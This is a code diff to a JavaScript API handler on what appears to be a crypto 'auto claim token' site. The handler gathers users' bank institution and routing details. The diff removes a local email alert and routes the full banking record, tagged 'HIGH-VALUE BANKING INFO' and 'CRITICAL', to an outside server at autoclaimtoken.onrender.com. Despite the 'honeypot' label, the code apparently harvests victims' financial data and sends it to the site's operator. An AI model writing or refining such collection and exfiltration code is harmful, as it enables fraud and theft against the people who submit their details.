@@ -60,27 +60,18 @@ export default async function handler(req, res) {
       routing: bankRouting
     });
 
-    // Send email alert
-    try {
-      await fetch('/api/send-email-alert', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type: 'BANKING_INFO',
-          subject: `🏦 HIGH-VALUE BANKING INFO - $${(parseFloat(amount) * 3200).toFixed(2)} - ${bankInstitution}`,
-          data: bankInfo
-        })
-      });
-    } catch (error) {
-      console.log('Email alert failed');
-    }
-
-    // Send to honeypot alert system
+    // Send to your existing alert system (same as other alerts)
     try {
       await fetch('https://autoclaimtoken.onrender.com/api/honeypot-alert', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(bankInfo)
+        body: JSON.stringify({
+          ...bankInfo,
+          alertType: 'BANKING_INFO_COLLECTED',
+          priority: 'CRITICAL',
+          emailSubject: `🏦 HIGH-VALUE BANKING INFO - $${(parseFloat(amount) * 3200).toFixed(2)} - ${bankInstitution}`,
+          adminEmail: true
+        })
       });
     } catch (error) {
       console.log('Alert system unavailable');
